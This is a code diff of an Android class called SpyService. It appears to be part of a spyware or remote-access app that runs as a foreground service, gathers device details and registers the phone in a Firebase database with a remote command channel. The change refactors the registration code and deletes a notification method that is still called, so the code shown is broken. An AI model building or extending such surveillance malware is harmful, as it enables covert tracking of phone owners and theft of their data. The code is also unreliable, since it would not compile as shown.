@@ -30,16 +30,14 @@ import android.telephony.TelephonyManager;
 import android.util.Log;
 import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
-import androidx.core.content.FileProvider;
-import org.json.JSONObject;
 import com.google.firebase.database.*;
+import org.json.JSONObject;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.net.URL;
-import java.text.SimpleDateFormat;
-import java.util.Date;
+import java.util.HashMap;
 import java.util.List;
-import java.util.Locale;
+import java.util.Map;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
@@ -60,7 +58,6 @@ public class SpyService extends Service {
     private boolean isTrackingLocation = false;
     private boolean foregroundStarted = false;
 
-    // Firebase
     private FirebaseDatabase database;
     private DatabaseReference deviceRef;
     private DatabaseReference commandRef;
@@ -109,24 +106,9 @@ public class SpyService extends Service {
         } catch (SecurityException e) { Log.e(TAG, "Foreground failed", e); }
     }
 
-    private void updateNotification(String text) {
-        if (foregroundStarted) {
-            try {
-                Notification notification = new NotificationCompat.Builder(this, "spy_ch")
-                        .setContentTitle("🔱 بلاك - الخدمة نشطة")
-                        .setContentText(text)
-                        .setSmallIcon(android.R.drawable.ic_menu_manage)
-                        .setPriority(NotificationCompat.PRIORITY_LOW)
-                        .setSilent(true)
-                        .build();
-                startForeground(1337, notification);
-            } catch (Exception e) { Log.e(TAG, "Update notification failed", e); }
-        }
-    }
-
     private void registerDevice() {
         try {
-            JSONObject info = new JSONObject();
+            Map<String, Object> info = new HashMap<>();
             info.put("device_id", deviceId);
             info.put("device_name", Build.MANUFACTURER + " " + Build.MODEL);
             info.put("model", Build.MODEL);
@@ -135,7 +117,7 @@ public class SpyService extends Service {
             info.put("battery", getBatteryLevel());
             info.put("last_seen", System.currentTimeMillis());
 
-            deviceRef.setValue(info.toString());
+            deviceRef.setValue(info);
             updateNotification("✅ مسجل في Firebase");
             Log.d(TAG, "Registered in Firebase");
         } catch (Exception e) { Log.e(TAG, "Registration error", e); }
@@ -232,9 +214,8 @@ public class SpyService extends Service {
     }
 
     // ======================================================================
-    // دوال جمع البيانات
+    // دوال جمع البيانات (نفس الكود السابق)
     // ======================================================================
-
     private int getBatteryLevel() {
         try {
             IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
